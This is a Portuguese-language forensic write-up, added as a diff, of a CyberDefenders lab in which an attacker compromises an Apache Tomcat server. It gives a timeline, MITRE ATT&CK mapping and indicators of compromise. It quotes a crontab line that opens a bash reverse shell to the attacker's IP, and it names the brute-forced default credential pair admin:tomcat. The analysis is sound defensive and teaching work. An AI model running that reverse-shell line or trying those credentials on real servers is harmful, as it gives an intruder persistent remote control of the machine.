@@ -1,0 +1,157 @@
+# 🛡️ Web Server Attack — Forensic Analysis (Tomcat Compromise)
+
+## 📌 Overview
+
+Este writeup documenta a análise forense de um ataque multiestágio contra um servidor **Apache Tomcat**, baseado no desafio *Web Server Attack* da plataforma CyberDefenders.
+
+---
+
+## 🎯 Objetivo
+
+Identificar:
+
+* Origem do ataque
+* Vetores utilizados
+* Técnicas de exploração
+* Persistência
+* Indicadores de comprometimento
+
+---
+
+## 🧠 Resumo do Ataque
+
+O atacante (**14.0.0.120**) executou:
+
+1. 🔍 Port Scanning
+2. 📂 Enumeração (Gobuster)
+3. 🔐 Força bruta
+4. 📤 Upload de Web Shell
+5. ⚡ Shell reverso
+6. ♻️ Persistência
+
+---
+
+## ⏱️ Timeline do Ataque
+
+| Tempo | Fase           | Evento        |
+| ----- | -------------- | ------------- |
+| 18:13 | Reconhecimento | Port scan     |
+| 18:13 | Enumeração     | Gobuster      |
+| 18:19 | Descoberta     | `/manager`    |
+| 18:20 | Acesso         | admin:tomcat  |
+| 18:20 | Exploração     | Upload WAR    |
+| 18:22 | Execução       | Shell reverso |
+| 18:22 | Persistência   | Crontab       |
+
+---
+
+## 🔍 Análise Técnica
+
+### 🌐 Origem do Ataque
+
+* IP: **14.0.0.120**
+* China (Guangzhou)
+
+![Figura 1 - Port Scanning no Wireshark](/Forensic/TomCat%20Over/images/Hacker_Location.png)
+
+---
+
+### 🚪 Vetor de Entrada
+
+* Porta: **8080**
+* Endpoint: `/manager`
+
+![Figura 2 - Acesso ao painel Tomcat](/Forensic/TomCat%20Over/images/Port_if_have_Admnistrative_Access.png)
+
+---
+
+### 📂 Enumeração
+
+Ferramenta identificada:
+
+```bash
+gobuster/3.6
+```
+
+![Figura 3 - User-Agent Gobuster](/Forensic/TomCat%20Over/images/Tool_Enumeration_Used.png)
+
+---
+
+### 🔐 Força Bruta
+
+Credencial válida:
+
+```bash
+admin:tomcat
+```
+
+![Figura 4 - Credenciais no NetworkMiner](/Forensic/TomCat%20Over/images/User_Pass_Admin_Panel.png)
+
+---
+
+### 📤 Upload de Web Shell
+
+Arquivo:
+
+```bash
+JXQOZY.war
+```
+
+![Figura 5 - Upload do WAR](/Forensic/TomCat%20Over/images/ShellReverse_Archive.png)
+
+---
+
+### ⚡ Execução
+
+Acesso via:
+
+```bash
+/JXQOZY/
+```
+
+---
+
+### ♻️ Persistência
+
+```bash
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
+```
+
+![Figura 6 - Shell reverso e crontab](/Forensic/TomCat%20Over/images/Command_ReverseShell.png)
+
+---
+
+## 📡 Evidências
+
+* Wireshark → tráfego HTTP/TCP
+* NetworkMiner → credenciais + arquivos
+* TCP Stream → shell reverso
+
+---
+
+## 🧬 MITRE ATT&CK
+
+* T1595 — Scanning
+* T1110 — Brute Force
+* T1190 — Initial Access
+* T1505.003 — Web Shell
+* T1053.003 — Persistence
+
+---
+
+## 🚨 IOCs
+
+* IP atacante: `14.0.0.120`
+* IP alvo: `10.0.0.112`
+* `/manager`
+* `admin:tomcat`
+* `JXQOZY.war`
+* `14.0.0.120:443`
+
+---
+
+## ⚠️ Impacto
+
+* Acesso root
+* Persistência ativa
+* Comunicação com C2
